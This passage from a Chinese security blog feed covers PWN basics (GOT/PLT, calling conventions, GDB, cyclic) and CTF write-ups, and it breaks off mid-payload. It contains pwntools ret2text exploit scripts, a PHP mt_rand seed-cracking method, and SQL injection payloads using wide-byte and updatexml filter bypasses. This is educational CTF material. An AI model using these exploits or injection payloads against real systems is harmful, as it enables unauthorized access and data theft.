GOT表和PLT表</h3><p>为了更好的用户体验和内存<em>C*</em>P<strong>U<em>的利用率，程序编译时会采用两种表进行辅助，一个为</em>P</strong>L<strong>T<em>表，一个为</em>G</strong>O<strong>T<em>表，</em>P</strong>L<strong>T<em>表可以称为内部函数表，</em>G</strong>O<strong>T<em>表为全局函数表（也可以说是动态函数表这是个人自称），这两个表是相对应的，什么叫做相对应呢，</em>P</strong>L<strong>T<em>表中的数据就是</em>G</strong>O*<em>T</em>表中的一个地址，可以理解为一定是一一对应的，如下图：</p><p><img src="https://img-blog.csdn.net/20170123151558845?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMTg2NjEyNTc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="img"></p><h3 id="0x-05-64位汇编参数传递"><a href="#0x-05-64位汇编参数传递" class="headerlink" title="0x 05 64位汇编参数传递"></a>0x 05 64位汇编参数传递</h3><p><img src="https://bbs.pediy.com/upload/attach/201902/827130_P7PCJ24ZK3TVPMA.png" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</span><br><span class="line"></span><br><span class="line">参数个数大于 7 个的时候</span><br><span class="line">H(a, b, c, d, e, f, g, h);</span><br><span class="line">a-&gt;%rdi, b-&gt;%rsi, c-&gt;%rdx, d-&gt;%rcx, e-&gt;%r8, f-&gt;%r9</span><br><span class="line">h-&gt;8(%esp)</span><br><span class="line">g-&gt;(%esp)</span><br><span class="line">call H</span><br><span class="line"></span><br><span class="line">write函数需要三个参数，需要rdi，rsi，rdx三个寄存器</span><br><span class="line">http:&#x2F;&#x2F;abcdxyzk.github.io&#x2F;blog&#x2F;2012&#x2F;11&#x2F;23&#x2F;assembly-args&#x2F;</span><br></pre></td></tr></table></figure><h3 id="0x-06-内存对齐"><a href="#0x-06-内存对齐" class="headerlink" title="0x 06 内存对齐"></a>0x 06 内存对齐</h3><p><img src="/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20200119204051236.png" alt="image-20200119204051236"></p><ul><li>作用：减少CPU访问内存的次数</li><li>原因：</li></ul><p>1.平台原因(移植原因)：不是所有的硬件平台都能访问任意地址上的任意数据的；某些硬件平台只能在某些地址处取某些特定类型的数据，否则抛出硬件异常。<br>2.性能原因：数据结构(尤其是栈)应该尽可能地在自然边界上对齐。原因在于，为了访问未对齐的内存，处理器需要作两次内存访问；而对齐的内存访问仅需要一次访问。<br>参考资料： <a href="https://mp.weixin.qq.com/s?src=11&timestamp=1579437525&ver=2106&signature=nR5axh9kvfbbOyiJz7Xog*tdwlSkaLY5ecX7Rztxmt3AeBlxmpC2vgKCji6l6OBEoiKvO9K8Pscd27wxWv0oMZYrdmMCWYDIf6qsc*g2QAQ*n-XZqB*bgtAw2SKh28zs&new=1" target="_blank" rel="noopener">【底层原理】C/C++内存对齐详解</a>       </p><h3 id="0x-07-GDB调试命令"><a href="#0x-07-GDB调试命令" class="headerlink" title="0x 07 GDB调试命令"></a>0x 07 GDB调试命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">（gdb）help：查看命令帮助，具体命令查询在gdb中输入help + 命令,简写h</span><br><span class="line"></span><br><span class="line">（gdb）run：重新开始运行文件（run-text：加载文本文件，run-bin：加载二进制文件）,简写r</span><br><span class="line"></span><br><span class="line">（gdb）start：单步执行，运行程序，停在第一执行语句</span><br><span class="line"></span><br><span class="line">（gdb）list：查看原代码（list-n,从第n行开始查看代码。list+ 函数名：查看具体函数）,简写l</span><br><span class="line"></span><br><span class="line">（gdb）set：设置变量的值</span><br><span class="line"></span><br><span class="line">（gdb）next：单步调试（逐过程，函数直接执行）,简写n</span><br><span class="line"></span><br><span class="line">（gdb）step：单步调试（逐语句：跳入自定义函数内部执行）,简写s</span><br><span class="line"></span><br><span class="line">（gdb）backtrace：查看函数的调用的栈帧和层级关系,简写bt</span><br><span class="line"></span><br><span class="line">（gdb）frame：切换函数的栈帧,简写f</span><br><span class="line"></span><br><span class="line">（gdb）info：查看函数内部局部变量的数值,简写i</span><br><span class="line"></span><br><span class="line">（gdb）finish：结束当前函数，返回到函数调用点</span><br><span class="line"></span><br><span class="line">（gdb）continue：继续运行,简写c</span><br><span class="line"></span><br><span class="line">（gdb）print：打印值及地址,简写p</span><br><span class="line"></span><br><span class="line">（gdb）quit：退出gdb,简写q</span><br><span class="line"></span><br><span class="line">（gdb）break+num：在第num行设置断点,简写b</span><br><span class="line"></span><br><span class="line">（gdb）info breakpoints：查看当前设置的所有断点</span><br><span class="line"></span><br><span class="line">（gdb）delete breakpoints num：删除第num个断点,简写d</span><br><span class="line"></span><br><span class="line">（gdb）display：追踪查看具体变量值</span><br><span class="line"></span><br><span class="line">（gdb）undisplay：取消追踪观察变量</span><br><span class="line"></span><br><span class="line">（gdb）watch：被设置观察点的变量发生修改时，打印显示</span><br><span class="line"></span><br><span class="line">（gdb）i watch：显示观察点</span><br><span class="line"></span><br><span class="line">（gdb）enable breakpoints：启用断点</span><br><span class="line"></span><br><span class="line">（gdb）disable breakpoints：禁用断点</span><br><span class="line"></span><br><span class="line">（gdb）x：查看指定内存地址内容  x&#x2F;20xw 显示20个单元，16进制，4字节每单元</span><br><span class="line"> https:&#x2F;&#x2F;www.cnblogs.com&#x2F;redman274&#x2F;p&#x2F;12164753.html</span><br><span class="line"> 如果地址所指的是字符串，那么格式可以是s，如果地址是指令地址，那么格式可以是i</span><br><span class="line"> </span><br><span class="line">（gdb）run argv[1] argv[2]：调试时命令行传参</span><br><span class="line"></span><br><span class="line">（gdb）set follow-fork-mode child#Makefile项目管理：选择跟踪父子进程（fork()）</span><br><span class="line"></span><br><span class="line">gdb 中step next 与finish的区别</span><br><span class="line">step 就是单步执行，遇到子函数就进入并且继续单步执行；在其他调试其中相当于step-into命令，作用是移动到下一个可执行的代码行。如果当前行是一个函数调用，则调试器进入函数并停止在函数体的第一行。step可以帮助初步揭开代码位置的谜团，例如：函数调用和函数本身可能在不同的文件中。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">next 是在单步执行时，在函数内遇到子函数时不会进入子函数内单步执行，而是将子函数整个执行完再停止，也就是把子函数整个作为一步。在其他调试器中相当于step-over，作用是在同一个调用栈层中移动到下一个可执行的代码行。调试器不会进入函数体。如果当前行是函数的最后一行，则，next将进入下一个栈层，并在调用函数的下一行停止。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">finish就是但单步执行到子函数内时，用step out就可以执行完子函数余下部分，并返回到上一层函数。在其他调试器中相当于step-out，作用是在栈中前进到到下一层，并在调用函数的下一行停止。</span><br></pre></td></tr></table></figure><h3 id="0x-08-cyclic工具"><a href="#0x-08-cyclic工具" class="headerlink" title="0x 08 cyclic工具"></a>0x 08 cyclic工具</h3><p>使用pwntools里面的cyclic工具生成字符串和计算偏移</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@hw-virtual-machine:&#x2F;home&#x2F;hw&#x2F;桌面&#x2F;PWN# cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line"></span><br><span class="line">root@hw-virtual-machine:&#x2F;home&#x2F;hw&#x2F;桌面&#x2F;PWN# cyclic -l 0x62616164</span><br><span class="line">112</span><br></pre></td></tr></table></figure><h3 id="0x-09-简单实例"><a href="#0x-09-简单实例" class="headerlink" title="0x 09 简单实例"></a>0x 09 简单实例</h3><p>源代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void exploit()</span><br><span class="line">&#123;</span><br><span class="line">    system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void func()</span><br><span class="line">&#123;</span><br><span class="line">    char str[0x20];</span><br><span class="line">    read(0, str, 0x50);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    func();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>func函数汇编</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function func:</span><br><span class="line">   0x080484b4 &lt;+0&gt;:push   ebp</span><br><span class="line">   0x080484b5 &lt;+1&gt;:mov    ebp,esp</span><br><span class="line">   0x080484b7 &lt;+3&gt;:sub    esp,0x38</span><br><span class="line">   0x080484ba &lt;+6&gt;:mov    eax,gs:0x14</span><br><span class="line">   0x080484c0 &lt;+12&gt;:mov    DWORD PTR [ebp-0xc],eax</span><br><span class="line">   0x080484c3 &lt;+15&gt;:xor    eax,eax</span><br><span class="line">   0x080484c5 &lt;+17&gt;:sub    esp,0x4</span><br><span class="line">   0x080484c8 &lt;+20&gt;:push   0x50   &#x2F;&#x2F;压入read函数的第三个参数</span><br><span class="line">   0x080484ca &lt;+22&gt;:lea    eax,[ebp-0x2c]   </span><br><span class="line">   0x080484cd &lt;+25&gt;:push   eax    &#x2F;&#x2F;压入read函数的第二个参数</span><br><span class="line">   0x080484ce &lt;+26&gt;:push   0x0    &#x2F;&#x2F;压入read函数的第一个参数</span><br><span class="line">   0x080484d0 &lt;+28&gt;:call   0x8048350 &lt;read@plt&gt;    &#x2F;&#x2F;调用plt表的</span><br><span class="line">   0x080484d5 &lt;+33&gt;:add    esp,0x10</span><br><span class="line">   0x080484d8 &lt;+36&gt;:nop</span><br><span class="line">   0x080484d9 &lt;+37&gt;:mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x080484dc &lt;+40&gt;:xor    eax,DWORD PTR gs:0x14</span><br><span class="line">   0x080484e3 &lt;+47&gt;:je     0x80484ea &lt;func+54&gt;</span><br><span class="line">   0x080484e5 &lt;+49&gt;:call   0x8048360 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x080484ea &lt;+54&gt;:leave  </span><br><span class="line">   0x080484eb &lt;+55&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">p &#x3D; process(&quot;.&#x2F;pwn1&quot;)</span><br><span class="line"></span><br><span class="line">offset &#x3D; 0x2c + 0x4</span><br><span class="line">payload &#x3D; &#39;a&#39;*offset + p32(0x0804849b)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>实例二：</p><p><img src="/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20200117223344225.png" alt></p><p><img src="/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20200117223446581.png" alt></p><p>汇编代码：</p><p>main函数中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040078c &lt;+145&gt;:lea    rax,[rbp-0x4]</span><br><span class="line">   0x0000000000400790 &lt;+149&gt;:mov    rsi,rax</span><br><span class="line">   0x0000000000400793 &lt;+152&gt;:mov    edi,0x400961</span><br><span class="line">   0x0000000000400798 &lt;+157&gt;:mov    eax,0x0</span><br><span class="line">   0x000000000040079d &lt;+162&gt;:call   0x4005d0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x00000000004007a2 &lt;+167&gt;:mov    edi,0x400964</span><br><span class="line">   0x00000000004007a7 &lt;+172&gt;:call   0x400580 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004007ac &lt;+177&gt;:mov    edx,DWORD PTR [rbp-0x4]   &#x2F;&#x2F;传入第三个参数值给edx</span><br><span class="line">   0x00000000004007af &lt;+180&gt;:lea    rax,[rbp-0x10]</span><br><span class="line">   0x00000000004007b3 &lt;+184&gt;:mov    rsi,rax    &#x2F;&#x2F;传入第二个参数值给rsi</span><br><span class="line">   0x00000000004007b6 &lt;+187&gt;:mov    edi,0x0    &#x2F;&#x2F;传入第一个参数值给edi</span><br><span class="line">   0x00000000004007bb &lt;+192&gt;:mov    eax,0x0</span><br><span class="line">   0x00000000004007c0 &lt;+197&gt;:call   0x4005a0 &lt;read@plt&gt;</span><br><span class="line">   0x00000000004007c5 &lt;+202&gt;:mov    eax,0x0</span><br><span class="line">   0x00000000004007ca &lt;+207&gt;:leave  </span><br><span class="line">   0x00000000004007cb &lt;+208&gt;:ret</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    sh &#x3D; remote(sys.argv[1], sys.argv[2])</span><br><span class="line">else:</span><br><span class="line">    sh &#x3D; process(&quot;.&#x2F;ret2text&quot;)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&quot;name:\n&quot;,str(50))</span><br><span class="line"></span><br><span class="line">payload&#x3D;&quot;a&quot;*0x18 + p64(0x0000000004006E6)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;name?\n&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">print(sh.recv())</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安恒杯丨新春祈福赛</title>
      <link href="/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/"/>
      <url>/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="0x-01-枯燥的抽奖"><a href="#0x-01-枯燥的抽奖" class="headerlink" title="0x 01 枯燥的抽奖"></a>0x 01 枯燥的抽奖</h3><ul><li><p>来源</p><p>GWCTF2019</p></li><li><p>解题过程</p></li></ul><ol><li>访问check.php得到源代码</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">#这不是抽奖程序的源代码！不许看！</span><br><span class="line">header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">session_start();</span><br><span class="line">if(!isset($_SESSION[&#39;seed&#39;]))&#123;</span><br><span class="line">$_SESSION[&#39;seed&#39;]&#x3D;rand(0,999999999);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[&#39;seed&#39;]);</span><br><span class="line">$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str&#x3D;&#39;&#39;;</span><br><span class="line">$len1&#x3D;20;</span><br><span class="line">for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show &#x3D; substr($str, 0, 10);</span><br><span class="line">echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;num&#39;]))&#123;</span><br><span class="line">    if($_POST[&#39;num&#39;]&#x3D;&#x3D;&#x3D;$str)&#123;x</span><br><span class="line">        echo &quot;&lt;p id&#x3D;flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;&lt;p id&#x3D;flag&gt;没抽中哦，再试试吧&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(&quot;check.php&quot;);</span><br></pre></td></tr></table></figure><p>根据代码可知是使用mt_srand()生成20位随机数，并且知道随机数的前10位</p><ol start="2"><li>这时我们可以用到一款工具<strong>php_mt_seed*</strong>（PHP mt_rand（）种子破解程序）*</li></ol><p>具体解法是先用脚本将伪随机数转换成php_mt_seed可以识别的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">str1&#x3D;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><br><span class="line">str2&#x3D;&#39;RymjbZRSUv&#39;</span><br><span class="line">str3 &#x3D; str1[::-1]</span><br><span class="line">length &#x3D; len(str2)</span><br><span class="line">res&#x3D;&#39;&#39;</span><br><span class="line">for i in range(len(str2)):</span><br><span class="line">    for j in range(len(str1)):</span><br><span class="line">        if str2[i] &#x3D;&#x3D; str1[j]:</span><br><span class="line">            res+&#x3D;str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;</span><br><span class="line">            break</span><br><span class="line">print res</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;output:</span><br><span class="line">53 53 0 61 24 24 0 61 12 12 0 61 9 9 0 61 1 1 0 61 61 61 0 61 53 53 0 61 54 54 0 61 56 56 0 61 21 21 0 61</span><br></pre></td></tr></table></figure><p>使用<a href="https://www.openwall.com/php_mt_seed/爆破出种子" target="_blank" rel="noopener">https://www.openwall.com/php_mt_seed/爆破出种子</a></p><p><img src="/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/image-20200128105021483.png" alt></p><p>我们即可得到满足条件的seed:<br>    seed = 0x29c11047 = 700518471 (PHP 7.1.0+)<br> 爆破出伪随机数和php版本.</p><ol start="3"><li>然后改写源码，生成完整字符串</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(700518471);</span><br><span class="line"></span><br><span class="line">$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str&#x3D;&#39;&#39;;</span><br><span class="line">$len1&#x3D;20;</span><br><span class="line">for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line">echo $str;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="0x-02-BabySqli"><a href="#0x-02-BabySqli" class="headerlink" title="0x 02 BabySqli"></a>0x 02 BabySqli</h3><ul><li><p>来源</p><p>GXYCTF2019</p></li><li><p>解题过程</p></li></ul><ol><li>题目提示了用md5做哈希，fuzz可以知道admin是账号。题目过滤了小括号、or和=，没有过滤union，用union万能密码绕过即可</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># username:</span><br><span class="line">-1&#39; union select 1, &#39;admin&#39;, &#39;202cb962ac59075b964b07152d234b70&#39; #</span><br><span class="line"># password:</span><br><span class="line">123</span><br></pre></td></tr></table></figure><h3 id="0x-03-BabySqli-2"><a href="#0x-03-BabySqli-2" class="headerlink" title="0x 03 BabySqli 2"></a>0x 03 BabySqli 2</h3><ul><li><p>来源</p><p>GXYCTF2019</p></li><li><p>解题过程</p></li></ul><ol><li>题目提示了支持中文，就可以想到宽字节，登陆之后发现有一个显示位，可以通过联合查询得到flag</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">题目考点和过滤：</span><br><span class="line">宽字节注入，过滤0x，union select where置空</span><br><span class="line"></span><br><span class="line"># 显示database</span><br><span class="line">name&#x3D;1%df%27ununionion%20selselectect%201,char(97,100,109,105,110),database()%23&amp;pw&#x3D;1</span><br><span class="line"># 得到数据库名为web_sqli</span><br><span class="line"></span><br><span class="line"># 显示表名</span><br><span class="line">name&#x3D;1%df%27ununionion%20selselectect%201,char(97,100,109,105,110),group_concat(table_name)%20from%20information_schema.tables%20whwhereere%20table_schema&#x3D;database()%23&amp;pw&#x3D;1</span><br><span class="line"># 得到表名为f14g,user</span><br><span class="line"></span><br><span class="line"># 显示f14g列名</span><br><span class="line">name&#x3D;1%df%27ununionion%20selselectect%201,char(97,100,109,105,110),group_concat(column_name)%20from%20information_schema.columns%20whwhereere%20table_name%20&#x3D;%20char(102,49,52,103)%23&amp;pw&#x3D;1</span><br><span class="line"># 得到f14g列名为b80bb7740288fda1f201890375a60c8f,327a6c4304ad5938eaf0efb6cc3e53dc</span><br><span class="line"></span><br><span class="line"># 拿到flag</span><br><span class="line">name&#x3D;1%df%27ununionion%20selselectect%201,char(97,100,109,105,110),327a6c4304ad5938eaf0efb6cc3e53dc%20from%20f14g%20limit%2022,1%23&amp;pw&#x3D;1</span><br></pre></td></tr></table></figure><p>报错注入payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 显示database</span><br><span class="line">name&#x3D;admin%df%27%20and%20updatexml(1,concat(1,database()),1)%20--+&amp;pw&#x3D;1</span><br><span class="line"></span><br><span class="line"># 显示表名</span><br><span class="line">name&#x3D;admin%df%27%20and%20updatexml(1,concat(1,(seSELECTlect%20group_concat(table_name)%20from%20information_schema.tables%20whWHEREere%20table_schema&#x3D;database()%20limit%200,1)),1)%20--+&amp;pw&#x3D;1</span><br><span class="line"># Error: XPATH syntax error: &#39;f14g,user&#39; </span><br><span class="line"></span><br><span class="line"># 显示f14g列名</span><br><span class="line">name&#x3D;admin%df%27%20and%20updatexml(1,concat(1,%20(seSELECTlect%20group_conca</span><br><span class="line">t(column_name)%20from%20information_schema.columns%20wherWHEREe%20TABLE_NAME</span><br><span class="line">&#x3D;char(102,49,52,103))),1)%20--+&amp;pw&#x3D;1</span><br><span class="line"># Error: XPATH syntax error: &#39;b80bb7740288fda1f201890375a60c8f&#39; </span><br><span class="line"></span><br><span class="line"># 查字段</span><br><span class="line">name&#x3D;admin%df%27%20and%20updatexml(1,concat(1,(seleSELECTct%20concat(327a6c4304ad5938eaf0efb6cc3e53dc)%20from%20f14g%20limit%200,1),1),1)%20--+%20&amp;pw&#x3D;y1ng</span><br><span class="line"># Error: XPATH syntax error: &#39;VGhlIGZpcnN0IG1hbiBuYW1lIHdhcyBr&#39; </span><br><span class="line"></span><br><span class="line"># 查flag</span><br><span class="line">name&#x3D;admin%df%27%20and%20updatexml(1,concat(1,(seleSELECTct%20concat(327a6c4304ad5938eaf0efb6cc3e53dc)%20from%20f14g%20limit%2022,1),1),1)%20--+%20&amp;pw&#x3D;1</span><br><span class="line"># Error: XPATH syntax error: &#39;R1hZe2cwT2Rfam9iMWltX3NvX3ZlZ2V0&#39; </span><br><span class="line"># 因为 updatexml 返回最大长度就是32，超过32位的被丢弃了，所以上面无论是歌词还是flag，base64都经常缺个尾</span><br><span class="line"># substr() 可以指定从字符串的某个位置开始，返回自定义长度：</span><br><span class="line">name&#x3D;admin%df%27 and updatexml(1,concat(1, substr((seleSELECTct 